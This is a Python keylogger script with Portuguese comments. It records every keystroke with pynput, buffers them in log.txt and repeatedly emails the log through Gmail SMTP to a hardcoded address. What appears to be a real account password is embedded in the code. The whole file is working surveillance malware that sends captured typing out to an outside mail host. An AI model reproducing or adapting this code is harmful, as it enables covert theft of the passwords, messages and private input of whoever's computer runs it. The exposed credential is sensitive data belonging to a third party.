import smtplib
import ssl
import time
from pynput.keyboard import Key, Listener


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("backspace") > 0:
                f.write('*')
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("tab") > 0:
                f.write('tab')
            #se apagar com backspace Mmostra oq foi apagado com *
            elif k.find("space") > 0:
                f.write('  ')

            
def on_release(key):
    if key == Key.enter:
        return False


def main():
    try:
        print ("Conectando ao servidor SMTP...")
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls(context=simple_email_context)
        TIE_server.login(email_from, pswd)
        print ("Conexão estabelecida com sucesso!")

        print()
        print(f"Enviando email para {email_to}...")
        TIE_server.sendmail(email_from, email_to, message)
        print(f"Email enviado com sucesso para {email_to}!")

    except Exception as e:
        print(e)
    finally:
        print("Fechando conexão com o servidor SMTP...")
        TIE_server.quit()


i = 0

while i < 100:

    count = 0
    keys = []


    #captura as teclas pressionadas e guarda em um arquivo e depois de 60 segundos sai do loop
    with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
    write_file(keys)

    smtp_port = 587
    smtp_server = "smtp.gmail.com"

    message = open("log.txt", "r").read()

    email_from = "sensteveoo7@gmail.com" #email que ira enviar a mensagem configurado
    email_to = "sensteveoo7@gmail.com" #email que ira receber a mensagem

    pswd = "wltsqjhpskjmerrj"# CODIGO DE ACESSO DO EMAIL


    simple_email_context = ssl.create_default_context()

    main()

    #apaga o conteudo do arquivo log.txt
    open("log.txt", "w").close()


    i += 1
